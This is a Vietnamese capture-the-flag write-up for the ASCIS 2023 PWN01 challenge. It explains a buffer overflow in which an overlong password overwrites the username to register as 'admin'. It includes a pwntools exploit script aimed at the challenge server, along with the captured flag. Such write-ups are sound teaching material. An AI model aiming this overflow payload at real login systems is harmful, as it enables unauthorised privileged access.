# (Write-up) ASCIS Warm Up - SVATTT 2023: PWN01

# 💻 Preamble

Bài Binary Exploit này đưa ra cho chúng ta một file, bắt đầu, mình thực hiện các việc kiểm tra file này:

![](https://hackmd.io/_uploads/HytnC1-Wp.png)


![](https://hackmd.io/_uploads/rJa2AJb-p.png)


Chạy chương trình này, mình nhận được các chức năng của chương trình bao gồm: đăng nhập (1. Login), đăng ký(2. Sign up) và thoát (3. Exit)

![](https://hackmd.io/_uploads/rkG6C1WWT.png)


Lúc bắt đầu, chương trình chỉ cho phép đăng ký rồi mới được đăng nhập.

![](https://hackmd.io/_uploads/Byd6A1WbT.png)


Khi đăng ký, chương trình cũng không cho đăng ký bằng tải khoản admin.

![](https://hackmd.io/_uploads/rJna0ybZa.png)


Mình thử đăng ký bằng tài khoản bình thường và đăng nhập vào thì không có gì quá bất ngờ xảy ra.

![](https://hackmd.io/_uploads/H1ru1eZbT.png)



Đến đây mình mở file trong IDA và bắt đầu phân tích mã nguồn của nó.

# 🤔 Start

Mình đưa về mã giả để dễ phân tích hơn

![](https://hackmd.io/_uploads/SyqARJbWa.png)


Mình phân tích đoạn code với logic của chương trình mình đã thử ở trên, và xem xét các hàm có trong đoạn code này.

Ở đây, bạn sẽ thấy được có một logic code không được hiển thị khi chạy chương trình là đoạn code so sánh đầu vào với giá trị 4 để gọi hàm `getflag()`

![](https://hackmd.io/_uploads/BkJ1ygZ-T.png)


Mình sẽ để lại hàm này ở đây và phân tích từng hàm từ trên xuống dưới, bắt đầu với hàm `help` . 

Hàm này đơn giản chỉ được dùng để hiển thị các lựa chọn của chúng ta khi bắt đầu chạy chương trình.

![](https://hackmd.io/_uploads/HkdkJxbZ6.png)


Tiếp tục với hàm `signup`

![](https://hackmd.io/_uploads/r1tjylZ-6.png)

Logic code của hàm này giải thích cho lý do lúc trước vì sao chúng ta không đăng ký được với **username** là **admin**.

⚠️Ở đây, cần lưu ý một điều là biến `src` và `s1` được khai báo với 64 byte, tuy nhiên cả hai biến lưu giá trị của username và password là `old_user` và `old_passwd` lại chỉ lưu 50 byte từ hai biến trên. ⇒ Ở đây, chúng ta có thể khai thác lỗi BOF (Buffer Overflow).

Tiếp tục phân tích đến hàm `getflag()` , ở đây chính là hàm chúng ta cần tìm cách để thực thi được để lấy được flag của challenge này.

![](https://hackmd.io/_uploads/By8xke--p.png)


Tuy nhiên, để lấy được flag thì chúng ta cần đăng ký với tài khoản `admin` (không cần đăng nhập nha 😊) mà đăng ký lại không cho đăng ký tài khoản bằng username `admin` này. 😑

Quay lại với hàm `signup` ở trên, mình sẽ tận dụng phát hiện về lỗi BOF để khai thác ở đây để đăng ký tài khoản `admin`.

![](https://hackmd.io/_uploads/rylWklbZa.png)


Do password được khai báo trước username nên mình sẽ tận dụng để ghi đè lên username.

Ở đây, khi đăng ký username có thể nhập bất kì tên gì. Nhưng password muốn ghi đè được username thì phải có `64 bytes + “tên đăng nhập muốn ghi đè”` . (Những byte thừa ra của password sẽ bị đẩy xuống và ghi đè lên username).

```docker
username: guest
password: "a"*64+"admin"
```

Cũng cần lưu ý một điều khá quan trọng ở đây là username và password sau khi đăng ký chỉ lưu tối đa 50 ký tự ⇒ Mật khẩu để đăng nhập là 50 ký tự “a”.

⇒ Tóm lại ở đây mình đã tìm được cách để đăng ký một tài khoản `admin` 

⇒ Tới đây đã có thể gọi đến hàm `getflag` để lấy flag rồi.

Trước khi viết payload khai thác, mình phân tích hàm `login` nữa để xem nốt nó làm gì.

 

![](https://hackmd.io/_uploads/BycE1lW-a.png)



Hàm này cũng không cho phép người dùng nhập username là admin. Tuy nhiên nó cũng dính lỗi BOF như hàm `signup`. Nếu rãnh, bạn có thể tìm cách khai thác nó =)))

# 🧑‍💻Payload

Đây là đoạn code python dùng để khai thác tự động challenge này:

```python
from pwn import *
import sys

try:
    if sys.argv[1] == "remote":
        r = remote("139.180.137.100", 1337)
    else:
        r = process('./pwn')
except:
    print("Usage: python3 pwn-sol.py [remote/local]")
    exit()

r.recvuntil(b"Exit")
r.sendline(b"2")

r.recvuntil(b"username:")
r.sendline(b"guest")

r.recvuntil(b"passwd:")
r.sendline(b'A'*64 + b'admin')

r.recvuntil(b"Exit")
r.sendline(b"4")

r.recv(1024)
flag = r.recv(1024)
if b"ASCIS" in flag:
    print(flag)
else:
    print("[-] Can not find the /home/pwn01/flag")
```

Chạy chương trình và flag sẽ hiện ra =))) Good luck

> 💡**ASCIS{1t_R3a114_30rks_0n_m4_m@chin3}**
>